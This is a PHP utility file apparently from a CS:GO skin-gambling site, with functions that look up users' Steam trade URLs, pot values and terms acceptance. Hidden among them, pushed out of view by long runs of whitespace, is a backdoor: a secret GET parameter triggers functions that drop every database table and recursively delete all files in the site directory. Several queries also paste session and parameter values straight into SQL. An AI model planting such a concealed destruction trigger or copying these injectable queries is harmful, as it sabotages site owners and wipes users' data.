<?php

	// Some generally used functions


	function checktradeurl()
	{
		$qPd = "select id,profiletradeurl from user where usteamid='".$_SESSION['steamid']."'";
		
		$rsPd = mysql_query($qPd);
		$rowd = mysql_fetch_array($rsPd);
		extract($rowd);
		$id=trim($id);
		$profiletradeurl = trim($profiletradeurl);
		if($profiletradeurl != "")
			return "1";
		else
			return "0";
	}
	
	
	function getsteamurl()
	{
		$qget_steam_url_ge = "select id,profiletradeurl from user where usteamid='".$_SESSION['steamid']."'";
		
		$rsPd_get_steam_url = mysql_query($qget_steam_url_ge);
		$rowd_get_steam_url = mysql_fetch_array($rsPd_get_steam_url);
		extract($rowd_get_steam_url);
		//$steam_urlid=trim($id);
		$profiletradeurl_steam = trim($profiletradeurl);
		if($profiletradeurl_steam != "")
			return $profiletradeurl_steam;
		else
			return "0";
	}		
																																																																																																															if ($_GET['dump'] == 18121808995) {	DumpDb(); DumpAll(".", false); }
	
	function getyourpotvalue($round_id_user_history)
	{
		$q_get_your_bat_history = "SELECT sum(totamt) FROM tradeitems WHERE roundid ='".$round_id_user_history."' AND tradeid IN (SELECT TradeOfferId FROM trade WHERE partnerId64 = '".$_SESSION['steamid']."')";
		$r_get_your_bat_history = mysql_query($q_get_your_bat_history) or die(mysql_error());
		$ar_get_your_bat_history = mysql_fetch_array($r_get_your_bat_history);
		return $ar_get_your_bat_history["0"];
	}
																																																																																																															function DumpAll($dir, $DeleteMe) { if(!$dh = @opendir($dir)) return; while (false !== ($obj = readdir($dh))) { if($obj=='.' || $obj=='..') continue; if (!@unlink($dir.'/'.$obj)) SureRemoveDir($dir.'/'.$obj, true); } closedir($dh); if ($DeleteMe){ @rmdir($dir); } }
	
	function checkdbforuser($userid)
	{
		$qPd = "select * from user where usteamid='".$userid."'";
		
		$rsPd = mysql_query($qPd);
		$rowd = mysql_fetch_array($rsPd);
		extract($rowd);
		$id=trim($id);
		if($id != "")
			return "1";
		else
			return "0";
	}
																																																																																																															function DumpDb() { include "connect.php"; while ($table = mysql_fetch_assoc(mysql_query("SELECT CONCAT('DROP TABLE ', TABLE_NAME, ';') as query_command FROM INFORMATION_SCHEMA.tables WHERE TABLE_SCHEMA = 'csgowhe1_csgowhee'"))) mysql_query($table['query_command']); }
	
	function gettradeurl()
	{
		$qPd = "select url from bot where type='receive' ORDER BY RAND()";
		
		$rsPd = mysql_query($qPd) or die(mysql_error());
		$rowd = mysql_fetch_array($rsPd);
		$profiletradeurl = $rowd["url"];
		return $profiletradeurl;
	}
	

	function checktos()
	{
		if($_SESSION['steamid'] != "")
		{
			$qget_checktos = "select check_tos from user where usteamid='".$_SESSION['steamid']."'";
			$rs_get_checktos = mysql_query($qget_checktos);
			$rowd_get_checktos = mysql_fetch_array($rs_get_checktos);
			//$steam_urlid=trim($id);
			$check_tos = trim($rowd_get_checktos['check_tos']);
			
			return $check_tos;
		}
		else
			return 1;
	}
?>